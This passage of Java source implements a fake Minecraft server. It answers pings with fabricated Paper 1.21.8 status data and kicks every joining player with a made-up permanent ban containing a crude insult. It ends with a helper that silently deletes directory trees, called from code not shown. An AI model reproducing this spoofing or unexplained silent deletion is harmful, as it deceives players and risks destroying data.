                            String json=String.format("{\"version\":{\"name\":\"1.21.8\",\"protocol\":%d},\"players\":{\"max\":20500,\"online\":%d,\"sample\":[]},\"description\":{\"text\":\"A Minecraft Server\\nPaper 1.21.8\"},\"enforcesSecureChat\":false,\"previewsChat\":false}",protocolVersion,playerCount.get());

                            writeVarInt(out,json.length()+3);
                            writeVarInt(out,0x00);
                            writeString(out,json);
                            out.flush();
                            info("Ping from "+clientAddr+" (protocol "+protocolVersion+")");
                        }
                    }else if(nextState==2){
                        int loginLength=readVarInt(in);
                        int loginId=readVarInt(in);
                        String username=readString(in);

                        info(clientAddr+" attempting to join as '"+username+"' (protocol "+protocolVersion+")");

                        Thread.sleep(100);

                        String kickMsg = """
                       {
                         "text": "",
                         "extra": [
                           { "text": "⛔ You are banned from this server\\n\\n", "color": "red", "bold": true },
                           { "text": "Reason: ", "color": "gray" },
                           { "text": "You wanna fuck dinosakura ? \\n", "color": "yellow" },
                           { "text": "Banned by: ", "color": "gray" },
                           { "text": "Console\\n", "color": "aqua" },
                           { "text": "Unban date: ", "color": "gray" },
                           { "text": "90000000e+99000000000000000\\n\\n", "color": "dark_red" },
                           { "text": "Appeals are not available.", "color": "dark_gray", "italic": true }
                                   ]
                           }
""";

                        ByteArrayOutputStream buffer=new ByteArrayOutputStream();
                        DataOutputStream tempOut=new DataOutputStream(buffer);

                        writeVarInt(tempOut,0x00);
                        writeString(tempOut,kickMsg);
                        tempOut.flush();

                        byte[]packetData=buffer.toByteArray();
                        writeVarInt(out,packetData.length);
                        out.write(packetData);
                        out.flush();

                        info("Player '"+username+"' was kicked (banned by admin)");
                    }
                }

                Thread.sleep(100);
                client.close();
            }catch(Exception e){}
        }).start();
    }
    private static int readVarInt(java.io.DataInputStream in)throws IOException{
        int value=0;
        int position=0;
        byte currentByte;
        while(true){
            currentByte=in.readByte();
            value|=(currentByte&0x7F)<<position;
            if((currentByte&0x80)==0)break;
            position+=7;
            if(position>=32)throw new RuntimeException("VarInt too big");
        }
        return value;
    }

    private static void writeVarInt(java.io.DataOutputStream out,int value)throws IOException{
        while(true){
            if((value&~0x7F)==0){
                out.writeByte(value);
                return;
            }
            out.writeByte((value&0x7F)|0x80);
            value>>>=7;
        }
    }

    private static String readString(java.io.DataInputStream in)throws IOException{
        int length=readVarInt(in);
        byte[]bytes=new byte[length];
        in.readFully(bytes);
        return new String(bytes,"UTF-8");
    }

    private static void writeString(java.io.DataOutputStream out,String string)throws IOException{
        byte[]bytes=string.getBytes("UTF-8");
        writeVarInt(out,bytes.length);
        out.write(bytes);
    }

    private static void clean(File d){
        if(d!=null&&d.exists()){
            try{del(d.toPath());}catch(IOException e){}
        }
    }

    private static void del(Path p)throws IOException{
        if(Files.exists(p)){
            Files.walk(p).sorted((a,b)->b.compareTo(a)).forEach(x->{
                try{Files.delete(x);}catch(IOException e){}
            });
        }
    }
}